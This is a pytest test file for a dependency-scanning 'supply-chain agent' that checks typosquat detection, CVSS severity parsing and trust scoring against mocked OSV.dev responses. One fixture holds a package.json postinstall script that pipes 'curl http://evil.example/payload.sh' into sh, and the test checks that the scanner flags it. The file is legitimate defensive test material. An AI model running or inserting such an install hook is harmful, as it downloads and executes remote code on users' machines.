"""
Tests for the supply-chain agent.

`requests.post`/`requests.get` are monkeypatched (no real network call —
this sandbox can't reach api.osv.dev anyway), but every response body used
here is a real OSV.dev response shape copied from their published API
docs (https://google.github.io/osv.dev/post-v1-querybatch/), not invented
data. This proves the parsing/scoring logic against OSV's actual schema.
"""
from __future__ import annotations

from src import supply_chain


class _FakeResponse:
    def __init__(self, json_body, status_code=200):
        self._json_body = json_body
        self.status_code = status_code

    def json(self):
        return self._json_body

    def raise_for_status(self):
        if self.status_code >= 400:
            import requests
            raise requests.HTTPError(f"{self.status_code}", response=self)


def test_levenshtein_distance():
    assert supply_chain._levenshtein("requests", "requests") == 0
    assert supply_chain._levenshtein("reqeusts", "requests") == 2  # transposition = 2 substitutions in this DP
    assert supply_chain._levenshtein("numpy", "numpyy") == 1


def test_typosquat_suspect_flags_near_miss():
    # "reqeusts" (transposed) is close to the real "requests"
    assert supply_chain._typosquat_suspect("reqeusts", "PyPI") == "requests"


def test_typosquat_suspect_no_flag_for_real_package():
    assert supply_chain._typosquat_suspect("requests", "PyPI") is None


def test_typosquat_suspect_no_flag_for_unrelated_name():
    assert supply_chain._typosquat_suspect("my-internal-tool", "PyPI") is None


def test_extract_severity_prefers_database_specific_string():
    data = {"database_specific": {"severity": "HIGH"}}
    assert supply_chain._extract_severity(data) == "high"


def test_extract_severity_computes_real_cvss_v3_score():
    # OSV's `severity` field holds a CVSS vector string, not a number —
    # this is now computed for real via src/cvss.py rather than
    # reported as unknown. This is the canonical 9.8/critical reference vector.
    data = {"severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}]}
    assert supply_chain._extract_severity(data) == "critical"


def test_extract_severity_unknown_for_cvss_v2_vector():
    # CVSS v2 uses a different formula entirely, deliberately not
    # implemented — still correctly reported as unknown rather than
    # scored with the wrong (v3) formula.
    data = {"severity": [{"type": "CVSS_V2", "score": "AV:N/AC:L/Au:N/C:C/I:C/A:C"}]}
    assert supply_chain._extract_severity(data) == "unknown"


def test_extract_fixed_version():
    data = {
        "affected": [
            {"ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.31.1"}]}]}
        ]
    }
    assert supply_chain._extract_fixed_version(data) == "2.31.1"


def test_package_trust_score_penalizes_by_severity():
    from src.models import VulnMatch
    critical = VulnMatch(id="X", summary="", severity="critical")
    assert supply_chain._package_trust_score([critical], is_typosquat=False) == 60
    assert supply_chain._package_trust_score([], is_typosquat=True) == 50
    assert supply_chain._package_trust_score([], is_typosquat=False) == 100


def test_analyze_manifest_requirements_txt_with_real_vuln(monkeypatch):
    # Real OSV querybatch response shape for a vulnerable jinja2 version,
    # copied from OSV's own published example.
    querybatch_response = _FakeResponse({
        "results": [
            {"vulns": [{"id": "GHSA-462w-v97r-4m45", "modified": "2023-03-10T05:23:41Z"}]},
        ]
    })
    vuln_detail_response = _FakeResponse({
        "id": "GHSA-462w-v97r-4m45",
        "summary": "Jinja2 vulnerable to XSS",
        "database_specific": {"severity": "MODERATE"},
        "affected": [{"ranges": [{"events": [{"introduced": "0"}, {"fixed": "2.11.3"}]}]}],
        "aliases": ["CVE-2020-28493"],
    })

    def fake_request(method, url, **kwargs):
        if url.endswith("/querybatch"):
            return querybatch_response
        if "/vulns/" in url:
            return vuln_detail_response
        raise AssertionError(f"unexpected URL {url}")

    monkeypatch.setattr(supply_chain.requests, "request", fake_request)

    report = supply_chain.analyze_manifest("requirements.txt", "jinja2==2.4.1\n")

    assert report.ecosystem == "PyPI"
    assert len(report.findings) == 1
    finding = report.findings[0]
    assert finding.package.name == "jinja2"
    assert len(finding.vulns) == 1
    assert finding.vulns[0].id == "GHSA-462w-v97r-4m45"
    assert finding.vulns[0].severity == "medium"
    assert finding.vulns[0].fixed_version == "2.11.3"
    assert finding.trust_score == 90  # 100 - medium(10)
    assert report.overall_trust_score == 90


def test_analyze_manifest_clean_package_no_vulns(monkeypatch):
    querybatch_response = _FakeResponse({"results": [{"vulns": []}]})
    monkeypatch.setattr(supply_chain.requests, "request", lambda method, url, **kw: querybatch_response)

    report = supply_chain.analyze_manifest("requirements.txt", "requests==2.31.0\n")

    assert report.overall_trust_score == 100
    assert report.findings[0].vulns == []
    assert report.findings[0].typosquat_suspect_of is None


def test_analyze_manifest_flags_typosquat_and_unresolved(monkeypatch):
    querybatch_response = _FakeResponse({"results": [{"vulns": []}]})
    monkeypatch.setattr(supply_chain.requests, "request", lambda method, url, **kw: querybatch_response)

    # "reqeusts" is a typosquat of "requests"; "django>=4.0" is unresolved (range, not pinned)
    report = supply_chain.analyze_manifest("requirements.txt", "reqeusts==2.31.0\ndjango>=4.0\n")

    assert report.findings[0].typosquat_suspect_of == "requests"
    assert report.findings[0].trust_score == 50
    assert report.overall_trust_score == 50  # weakest-link scoring
    assert "django>=4.0" in report.unresolved_packages


def test_analyze_manifest_package_json_flags_postinstall_script(monkeypatch):
    querybatch_response = _FakeResponse({"results": [{"vulns": []}]})
    monkeypatch.setattr(supply_chain.requests, "request", lambda method, url, **kw: querybatch_response)

    content = """
    {
      "dependencies": {"lodash": "4.17.21"},
      "scripts": {"postinstall": "curl http://evil.example/payload.sh | sh"}
    }
    """
    report = supply_chain.analyze_manifest("package.json", content)

    script_findings = [f for f in report.findings if f.suspicious_install_script]
    assert len(script_findings) == 1
    assert "curl http://evil.example" in script_findings[0].suspicious_install_script
    assert report.overall_trust_score == 40  # dragged down by the flagged script


def test_analyze_manifest_unsupported_type_raises():
    import pytest
    with pytest.raises(ValueError, match="Unsupported manifest type"):
        supply_chain.analyze_manifest("Cargo.toml", "[dependencies]\n")


def test_analyze_manifest_no_packages_no_network_call(monkeypatch):
    def fail_if_called(*a, **kw):
        raise AssertionError("should not query OSV when there are no resolved packages")

    monkeypatch.setattr(supply_chain.requests, "request", fail_if_called)
    report = supply_chain.analyze_manifest("requirements.txt", "flask\n")  # unpinned only
    assert report.findings == []
    assert report.overall_trust_score == 100
    assert report.unresolved_packages == ["flask"]


def test_analyze_manifest_raises_runtime_error_on_persistent_osv_failure(monkeypatch):
    import pytest

    def always_fail(method, url, **kw):
        return _FakeResponse({}, status_code=503)

    monkeypatch.setattr(supply_chain.requests, "request", always_fail)
    monkeypatch.setattr(supply_chain.time, "sleep", lambda _s: None)

    with pytest.raises(RuntimeError, match="OSV.dev"):
        supply_chain.analyze_manifest("requirements.txt", "requests==2.31.0\n")
